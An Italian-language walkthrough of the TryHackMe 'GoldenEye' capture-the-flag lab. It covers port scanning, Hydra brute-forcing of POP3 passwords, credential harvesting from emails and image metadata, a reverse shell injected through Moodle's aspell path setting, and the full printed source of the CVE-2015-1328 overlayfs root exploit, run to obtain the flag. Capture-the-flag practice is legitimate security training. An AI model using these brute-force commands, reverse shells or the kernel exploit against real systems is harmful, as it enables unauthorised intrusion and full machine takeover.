
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/goldeneye

In questa stanza sarà presente una sfida guidata per hackerare la scatola in stile James Bond e ottenere il root.

Usa nmap per scansionare la rete alla ricerca di tutte le porte. Quante porte sono aperte?

```
nmap -p- -Pn 10.10.183.248
```
```
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
```

```
nmap -Pn -sVC -p25,80,55006,55007 10.10.183.248
```

```
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) AUTH-RESP-CODE TOP PIPELINING RESP-CODES USER UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA SASL(PLAIN) PIPELINING STLS AUTH-RESP-CODE TOP RESP-CODES USER UIDL

```

Quante porte sono aperte?
```
4
```
visitiamo e controlliamo il sorgente di
```
http://10.10.183.248/
```
terminal.js
```
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

Chi deve assicurarsi di aggiornare la propria password predefinita?

```
Boris
```

Qual è la loro password?
andiamo su
https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()
e decifriamo
```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

```
InvincibleHack3r
```
ora andiamo come trovato nello script all'indirizzo
```
http://10.10.183.248/sev-home/
```
e proviamo a loggarci con le credenziali trovate
```
boris:InvincibleHack3r
```
Abbiamo accesso all pagina
```
# GoldenEye

GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online **GoldenEye Operators Training** to become an Administrator of the GoldenEye system

Remember, since **_security by obscurity_** is very effective, we have configured our pop3 service to run on a very high non-default port
```
ti preghiamo di inviare un'e-mail a un supervisore GNO qualificato per ricevere la formazione online degli operatori Goldeneye per diventare un amministratore del Goldeneye System- dal momento che la sicurezza dell'oscurità è molto efficace, abbiamo configurato il nostro servizio POP3 per correre su una porta molto non defefault

Passiamo ai prossimi passi troviamo il servizio POP3
Lo troviamo su
```
nc 10.10.183.248 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
Pass InvincibleHack3r
-ERR [AUTH] Authentication failed.
```
Dai un'occhiata ad alcuni degli altri servizi che hai trovato durante la scansione Nmap. Le credenziali che hai sono riutilizzabili?
```
no
```
Se quelle credenziali non sembrano funzionare, puoi usare un altro programma per trovare altri utenti e password? Magari Hydra? Qual è la loro nuova password?
```
hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt
```

```
[55007][pop3] host: 10.10.183.248   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
```

```
secret1!
```
Ispeziona la porta 55007: quale servizio è configurato per utilizzare questa porta?
```
pop3
```


```
nc 10.10.183.248 55007
```

```
USER boris
```

```
Pass secret1!
```
chiediamo lista dei messaggi
```
list
```
```
+OK 3 messages:
1 544
2 373
3 921
.
```
leggiamo i messaggi, iniziamo dal primo
```
retr 1
```
```
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
retr 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
retr 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

```
```
La tua cooperazione con il nostro sindacato darà grandi risultati. In allegato ci sono i codici di accesso finali per GoldenEye. Posizionali in un file nascosto all'interno della directory principale di questo server e poi rimuovili da questa email. Può esserci solo un insieme di questi codici di accesso, e dobbiamo garantirli per l'esecuzione finale. Se vengono recuperati e catturati, il nostro piano fallirà miseramente!

Una volta che Xenia avrà accesso al sito di addestramento e si sarà familiarizzata con i codici del Terminale GoldenEye, procederemo alle nostre fasi finali...
```

Il codice si trova nel file /root della macchina, Chi è Xenia? Dov'è il sito di addestramento? Qual è la fase finale?
Finora sappiamo che Boris, Natalya, Janus e l'amministratore sconosciuto sono dietro questo progetto

Cerchiamo di ottenere la password di natalya con hydra
```
hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.183.248 -s 55007 pop3
```
```
[55007][pop3] host: 10.10.183.248   login: `natalya`   password: bird 
```
controlliamo la mail 
```
nc 10.10.183.248 55007
```

```
USER natalya
```

```
Pass bird
```
chiediamo lista dei messaggi
```
list
```

```
retr 1
```
```
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

```

Abbiamo  le credenziali di accesso della nuova studentessa Xenia ed un dominio interno chiamato severnaya-station.com/gnocertdir. 

aggiungiamo severnaya-station.com in /etc/hosts

```
sudo bash -c 'echo "10.10.183.248 severnaya-station.com" >> /etc/hosts'
```

vediamo cosa c'è su
```
http://severnaya-station.com/gnocertdir/
```

rispondiamo intanto alle domande
Cosa puoi trovare su questo servizio?
```
emails
```
Quale utente può decifrare i codici di Boris?
```
natalya
```


L'enumerazione è davvero fondamentale. Prendere appunti e consultarli può essere un'esperienza salvavita. Ora ci occuperemo di come ottenere una shell utente.

Prova a usare le credenziali che hai trovato prima. Con quale utente puoi accedere?

```
http://severnaya-station.com/gnocertdir/
```
ci logghiamo con
```
username: xenia
password: RCP90rulez!
```
Prova a usare le credenziali che hai trovato prima. Con quale utente puoi accedere?
```
xenia
```

Dai un'occhiata al sito. Quali altri utenti riesci a trovare?
tra i messaggi troviamo
```
doak
```

Qual era la password di questo utente?
```
hydra -l doak  -P /usr/share/set/src/fasttrack/wordlist.txt 10.10.183.248 -s 55007 pop3
```

```
[55007][pop3] host: 10.10.183.248   login: doak   password: goat
```

```
goat
```

Utilizza le credenziali di questo utente per esaminare tutti i servizi che hai trovato e scoprire più email.
```
nc 10.10.183.248 55007
```

```
USER doak
```

```
Pass goat
```
chiediamo lista dei messaggi
```
list
```
```
+OK 1 messages:
1 606

```
leggiamo i messaggi, iniziamo dal primo
```
retr 1
```
```
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

```
Quale altro utente puoi trovare su doak?
```
dr_doak
```
Qual è la password di questo utente?
```
4England!
```

ci logghiamo con le credenziali trovate
```
http://severnaya-station.com/gnocertdir/login/index.php
```
Dai un'occhiata ai loro file su moodle ( severnaya-station.com)
```
trovato un file s3cret.txt
```
Scarica gli allegati e controlla se contengono messaggi nascosti.
```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

```
http://severnaya-station.com/dir007key/for-007.jpg
```
analizziamo il file con
```
exiftool for-007.jpg
```
```
└─$ exiftool for-007.jpg
ExifTool Version Number         : 12.76
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2025:05:21 06:18:59-04:00
File Access Date/Time           : 2025:05:21 06:18:59-04:00
File Inode Change Date/Time     : 2025:05:21 06:18:59-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```
troviamo un codeice
```
Image Description               : eFdpbnRlcjE5OTV4IQ==
```
proviamo a vedere se è base64
```
echo "eFdpbnRlcjE5OTV4IQ==" | base64 --decode
```
forse è la password dell'admin!
```
xWinter1995x!
```
Utilizzando le informazioni trovate nell'ultima attività, accedi con il nuovo utente trovato.
```
http://severnaya-station.com/gnocertdir/
```
```
admin
```
```
xWinter1995x!
```
nel profilo troviamo
```
|   |   |
|---|---|
|Country:|Russian Federation|
|City/town:|none of your business!|
|Email address:|[boris@127.0.0.1](mailto:b%6f%72is@%31%327%2e%30%2e%30%2e%31)|
|First access:|Tuesday, 24 April 2018, 11:15 AM  (7 years 29 days)|
|Last access:|Wednesday, 21 May 2025, 05:33 PM  (8 secs)|
|Interests:|[breaking codes and spinning my pen](http://severnaya-station.com/gnocertdir/tag/index.php?tag=breaking%20codes%20and%20spinning%20my%20pen)|
```
Boris è il maestro del progetto

Poiché questo utente ha maggiori privilegi sul sito, puoi modificare le impostazioni di Moodle. Da qui puoi ottenere una shell inversa usando Python e Netcat.
Dai un'occhiata ad Aspell, il plugin per il controllo ortografico.

generare una reverse shell per accedere al mainframe di GoldenEye andando in Path to aspell

nella ricerca digitare aspell per trovare `Path to aspell` dove troviamo la seguente riga
```
sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
```
ora al suo posto iniettiamo una reverse shell
```
bash -c 'sh -i >& /dev/tcp/10.14.99.134/4444 0>&1'
```
impostiamo il correttore su **PSpellShell** (cercandolo sempre tramite search)
ci mettiamo in ascolto su kali
```
nc -lvnp 4444
```
Creiamo un articolo
e facciamo un controllo ortografico del blog appena creato

otteniamo la reverse shell!
```
$ ls
changelog.txt
classes
config.php
css
editor_plugin.js
editor_plugin_src.js
img
includes
rpc.php
$ 
```


Ora che hai elencato abbastanza cose per ottenere un login amministrativo Moodle e ottenere una shell inversa, è il momento di priv esc.

Scarica [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) per enumerare gli strumenti di sviluppo installati.

Per caricare il file sulla macchina, è necessario eseguire wget sulla macchina locale, poiché la macchina virtuale non sarà in grado di caricare file da internet. Seguire i passaggi per caricare un file sulla macchina virtuale:

- Scarica il file linuxprivchecker in locale
- Vai nella cartella contente il file scaricato sul tuo sistema
- Fai: 
```
python -m http.server 1337
```
ora andiamo sulla  macchina vittima e trasferiamo il file
```
wget <tuo IP>/<file>.py
```

```
wget http://10.14.99.134:1337/linuxprivchecker.py
```

```
python linuxprivchecker.py
```

Qual è la versione del kernel?
```
uname -a
```

```
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```
3.13.0-32-generic
```

Questa macchina è vulnerabile all'exploit overlayfs. L'exploit è tecnicamente molto semplice:

- Crea un nuovo utente e monta lo spazio dei nomi utilizzando un clone con i flag CLONE_NEWUSER|CLONE_NEWNS.
- Montare un overlayfs utilizzando /bin come file system inferiore, alcune directory temporanee come directory superiore e di lavoro.
- Il montaggio di Overlayfs sarebbe visibile solo all'interno dello spazio dei nomi utente, quindi lasciamo che il processo dello spazio dei nomi modifichi CWD in overlayfs, rendendo così overlayfs visibile anche all'esterno dello spazio dei nomi tramite il file system proc.
- Rendi scrivibile il mondo su overlayfs senza cambiare il proprietario
- Consentire al processo esterno allo spazio dei nomi utente di scrivere contenuti arbitrari nel file applicando una variante leggermente modificata dell'exploit SetgidDirectoryPrivilegeEscalation.
- Eseguire il binario su modificato

Puoi scaricare l'exploit da qui: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)
```
nano ofs.c
```
```
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
            
```
devo modificare questo codice (gcc)
A questo codice (CC) perchè gcc non è presente
```
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Dopodiché apriamo server python per trasferire il file
```
python -m http.server 1337
```
sulla macchina vittima mettersi in 
```
cd /tmp
```

```
wget http://10.14.99.134:1337/ofs.c
```

```
cc ofs.c -o ofs
```

```
./ofs
```

```
$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# whoami
root

```

```
# ls /root
# cd /root
# las
sh: 4: las: not found
# cd /root
# ls
# ls -al 
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

```

```
568628e0d993b1973adc718237da6e93
```

